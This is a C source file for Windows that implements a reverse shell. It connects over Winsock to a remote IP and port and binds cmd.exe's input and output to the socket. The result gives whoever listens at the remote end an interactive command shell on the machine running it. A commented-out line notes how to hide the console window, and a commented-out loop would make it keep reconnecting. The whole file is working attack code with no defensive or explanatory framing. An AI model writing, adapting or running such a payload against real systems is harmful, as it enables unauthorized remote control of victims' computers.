#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024

void BindSock(char* rhost, int rport);

int main(int argc, char** argv) {
    //FreeConsole(); // This is the way to make the cmd vanish
    char rhost[] = "xxxxxxxxxxxxxxxx"; // ip to connect to
    int rport = 8081;
    BindSock(rhost, rport);
    return 0;
}
void BindSock(char* rhost, int rport) {
    /*while (1) {*/
        SECURITY_ATTRIBUTES saAttr;
        saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
        saAttr.bInheritHandle = TRUE;
        saAttr.lpSecurityDescriptor = NULL;
        // Initialize Winsock
        WSADATA wsaData;
        int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
        if (iResult != NO_ERROR) {
            printf("WSAStartup function failed with error: %d\n", iResult);
            return;
        }
        printf("[*] Winsock init ... \n");
        //init socket props
        SOCKET sock;
        sock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0,0,0);
        if (sock == INVALID_SOCKET) {
            printf("socket function failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return;
        }
        printf("[*] Sock init ... \n");
        //Filling struc props
        struct sockaddr_in clientService;
        clientService.sin_family = AF_INET;
        InetPton(AF_INET, rhost, &(clientService.sin_addr));
        clientService.sin_port = htons(rport);

        printf("[*] attempting to connect \n");
        iResult = WSAConnect(sock, (SOCKADDR*)&clientService, sizeof(clientService),NULL,NULL,NULL,NULL);
        if (iResult == SOCKET_ERROR) {
            printf("[!] connect function failed with error: %ld\n", WSAGetLastError());
            iResult = closesocket(sock);
            if (iResult == SOCKET_ERROR)
                printf("[!] closesocket function failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return;
        }
        printf("[X] Sock Connected\n");

        STARTUPINFO si;
        PROCESS_INFORMATION pi;

        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));


        si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

        printf("[*] Created process props\n");

        CreateProcessA(NULL, "\"cmd.exe\"", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    //}
}
